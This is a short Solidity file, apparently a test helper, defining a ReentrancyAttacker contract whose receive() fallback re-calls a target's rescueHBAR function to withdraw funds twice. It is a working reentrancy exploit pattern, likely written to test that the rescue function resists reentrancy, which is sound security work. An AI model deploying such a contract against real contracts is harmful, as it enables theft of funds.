// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

interface IRescuable {
    function rescueHBAR(uint256 amount) external returns (bool);
}

contract ReentrancyAttacker {
    IRescuable internal target;
    uint256 internal amount;
    bool internal attacked;

    constructor(address _target, uint256 _amount) {
        target = IRescuable(_target);
        amount = _amount;
    }

    function attack() external {
        target.rescueHBAR(amount);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            target.rescueHBAR(amount);
        }
    }
}
